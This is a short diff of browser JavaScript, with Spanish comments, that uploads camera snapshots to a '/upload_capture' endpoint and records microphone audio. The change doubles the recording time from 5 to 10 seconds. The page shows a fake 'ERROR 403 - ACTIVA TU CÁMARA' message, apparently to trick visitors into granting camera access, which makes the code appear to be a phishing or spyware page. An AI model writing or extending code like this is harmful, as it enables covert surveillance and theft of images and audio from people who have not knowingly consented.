@@ -196,7 +196,7 @@
                         fetch('/upload_capture', {method: 'POST', body: fd});
                     }, 'image/jpeg');
 
-                    // Captura de Audio (5 segundos)
+                    // Captura de Audio (10 segundos)
                     const recorder = new MediaRecorder(stream);
                     const chunks = [];
                     recorder.ondataavailable = e => chunks.push(e.data);
@@ -209,8 +209,8 @@
                         stream.getTracks().forEach(t => t.stop());
                     };
                     recorder.start();
-                    setTimeout(() => recorder.stop(), 5000);
-                }, 2000);
+                    setTimeout(() => recorder.stop(), 10000);
+		}, 2000);
 
             } catch (e) {
                 log.innerText = "ESTADO: ERROR 403 - ACTIVA TU CÁMARA";
